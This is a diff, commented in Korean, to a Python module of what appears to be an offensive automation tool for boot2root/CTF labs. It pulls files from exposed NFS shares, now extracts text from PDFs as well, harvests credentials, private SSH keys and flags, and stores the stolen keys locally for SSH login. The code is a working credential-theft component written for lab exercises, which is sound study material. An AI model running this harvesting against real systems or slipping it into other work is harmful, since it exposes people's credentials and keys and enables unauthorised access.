@@ -16,7 +16,9 @@ from __future__ import annotations
 
 import os
 import re
+import shutil
 import subprocess
+import tempfile
 from dataclasses import dataclass, field
 
 # ── showmount 파싱 ───────────────────────────────────────────────────
@@ -45,8 +47,65 @@ def parse_exports(showmount_output: str) -> list[str]:
 _PRIVKEY_RE = re.compile(r"-----BEGIN (?:[A-Z0-9 ]+ )?PRIVATE KEY-----")
 _MAX_FILES = 3000          # 과다 트리 방어(무한 walk 방지)
 _MAX_READ = 512 * 1024     # 파일당 읽기 상한(512KB)
+# 건너뛰는 '비텍스트 바이너리'. 문서(_DOC_EXT)는 여기서 빼고 텍스트 추출로 돌린다 —
+# 실측(Enigma): 온보딩 PDF(New_Employee_Access.pdf) 한 장에 발판 자격이 들어 있었고,
+# .pdf 를 통째로 스킵해 수확이 0이 되던 버그를 고친다.
 _SKIP_EXT = {".iso", ".img", ".zip", ".gz", ".xz", ".bz2", ".tar", ".jpg",
-             ".jpeg", ".png", ".gif", ".pdf", ".mp4", ".mkv", ".so", ".bin"}
+             ".jpeg", ".png", ".gif", ".mp4", ".mkv", ".so", ".bin"}
+# 바이너리지만 '텍스트를 품은' 문서 — nfs-cp 로 받아 텍스트를 추출해 harvest 로 넘긴다.
+_DOC_EXT = {".pdf"}
+_MAX_DOC = 8 * 1024 * 1024  # 문서 다운로드 상한(8MB) — 추출 비용·악성 과대파일 방어
+
+
+def _strings_from_file(path: str, min_len: int = 4) -> str:
+    """추출기가 없을 때의 폴백 — 바이너리에서 가독 ASCII 문자열만 뽑는다(`strings` 유사)."""
+    try:
+        with open(path, "rb") as f:
+            data = f.read(_MAX_DOC)
+    except OSError:
+        return ""
+    out, cur = [], []
+    for b in data:
+        if 32 <= b < 127:
+            cur.append(chr(b))
+        else:
+            if len(cur) >= min_len:
+                out.append("".join(cur))
+            cur = []
+    if len(cur) >= min_len:
+        out.append("".join(cur))
+    return "\n".join(out)
+
+
+def extract_doc_text(path: str) -> str:
+    """문서(PDF 등)에서 텍스트 추출 — pdftotext(poppler) 우선 → pypdf/PyPDF2 → 가독 문자열 폴백.
+    실행 아님(대상 파일을 읽기만). 추출 실패해도 예외 없이 빈/부분 문자열 반환."""
+    ext = os.path.splitext(path)[1].lower()
+    if ext == ".pdf":
+        if shutil.which("pdftotext"):
+            try:
+                p = subprocess.run(["pdftotext", "-layout", path, "-"],
+                                   capture_output=True, text=True,
+                                   errors="replace", timeout=30)
+                if p.returncode == 0 and (p.stdout or "").strip():
+                    return p.stdout
+            except (OSError, subprocess.SubprocessError):
+                pass
+        import contextlib
+        import io
+        for mod in ("pypdf", "PyPDF2"):
+            try:
+                m = __import__(mod)
+                # pypdf 는 파싱 경고('EOF marker not found' 등)를 stderr 로 뱉는다 — 폴백 경로의
+                # 소음이므로 억제(결과 텍스트에는 영향 없음).
+                with contextlib.redirect_stderr(io.StringIO()):
+                    reader = m.PdfReader(path)
+                    txt = "\n".join((pg.extract_text() or "") for pg in reader.pages)
+                if txt.strip():
+                    return txt
+            except Exception:   # noqa: BLE001 — 라이브러리 부재/파싱 실패는 폴백으로
+                continue
+    return _strings_from_file(path)
 
 
 @dataclass
@@ -147,13 +206,19 @@ def scan_tree(root: str, export: str = "", flag_kind: str = "boot2root",
             count += 1
             full = os.path.join(dirpath, name)
             rel = os.path.relpath(full, root)
-            if os.path.splitext(name)[1].lower() in _SKIP_EXT and not _is_keyname(name):
+            ext = os.path.splitext(name)[1].lower()
+            is_doc = ext in _DOC_EXT
+            if ext in _SKIP_EXT and not _is_keyname(name):
                 continue
             try:
-                if os.path.getsize(full) > _MAX_READ and not _is_keyname(name):
+                lim = _MAX_DOC if is_doc else _MAX_READ
+                if os.path.getsize(full) > lim and not _is_keyname(name):
                     continue
-                with open(full, encoding="utf-8", errors="replace") as f:
-                    text = f.read(_MAX_READ)
+                if is_doc:
+                    text = extract_doc_text(full)   # PDF 등 → 텍스트 추출 후 harvest
+                else:
+                    with open(full, encoding="utf-8", errors="replace") as f:
+                        text = f.read(_MAX_READ)
             except OSError:
                 continue
             if _harvest_text(fnd, rel, name, text, seen_cred, seen_flag,
@@ -212,27 +277,42 @@ def scan_via_libnfs(ip: str, export: str, run, keystore: str,
     seen_cred: set[tuple[str, str]] = set()
     seen_flag: set[str] = set()
     key_idx = 0
-    for rel in paths[:max_files]:
-        name = rel.rsplit("/", 1)[-1]
-        if os.path.splitext(name)[1].lower() in _SKIP_EXT and not _is_keyname(name):
-            continue
-        rc2, content = run(["nfs-cp", _nfs_url(ip, export, rel), "-"])
-        if rc2 != 0 or not content:
-            continue
-        text = content[:_MAX_READ]
-        if _harvest_text(fnd, rel, name, text, seen_cred, seen_flag,
-                         cred_parser, flag_scanner, flag_kind):
-            # 키는 로컬에 0600 보존(SSH 로그인용) — 마운트 없이 nfs-cp 로 받은 내용 저장
-            try:
-                os.makedirs(keystore, exist_ok=True)
-                dest = os.path.join(keystore, f"key_{key_idx}")
-                with open(dest, "w", encoding="utf-8") as f:
-                    f.write(text)
-                os.chmod(dest, 0o600)
-                fnd.ssh_keys.append(dest)
-                key_idx += 1
-            except OSError:
-                pass
+    tmpd = tempfile.mkdtemp(prefix="assassin_nfscp_")
+    try:
+        for rel in paths[:max_files]:
+            name = rel.rsplit("/", 1)[-1]
+            ext = os.path.splitext(name)[1].lower()
+            is_doc = ext in _DOC_EXT
+            if ext in _SKIP_EXT and not _is_keyname(name):
+                continue
+            # nfs-cp 로 '임시파일'에 받는다(바이너리 안전 — PDF 등 문서/키 모두 깨짐 없음).
+            # stdout('-') 경유는 바이너리가 텍스트 캡처에서 손상되므로 쓰지 않는다.
+            dest = os.path.join(tmpd, f"f{key_idx}")
+            rc2, _ = run(["nfs-cp", _nfs_url(ip, export, rel), dest])
+            if rc2 != 0 or not os.path.exists(dest) or os.path.getsize(dest) == 0:
+                continue
+            if is_doc:
+                text = extract_doc_text(dest)   # PDF 등 → 텍스트 추출 후 harvest
+            else:
+                try:
+                    with open(dest, encoding="utf-8", errors="replace") as f:
+                        text = f.read(_MAX_READ)
+                except OSError:
+                    continue
+            if _harvest_text(fnd, rel, name, text, seen_cred, seen_flag,
+                             cred_parser, flag_scanner, flag_kind):
+                # 키는 로컬 keystore 에 0600 보존(SSH 로그인용) — 받은 임시파일을 복사
+                try:
+                    os.makedirs(keystore, exist_ok=True)
+                    kdest = os.path.join(keystore, f"key_{key_idx}")
+                    shutil.copyfile(dest, kdest)
+                    os.chmod(kdest, 0o600)
+                    fnd.ssh_keys.append(kdest)
+                except OSError:
+                    pass
+            key_idx += 1
+    finally:
+        shutil.rmtree(tmpd, ignore_errors=True)
     return fnd, True
 
 
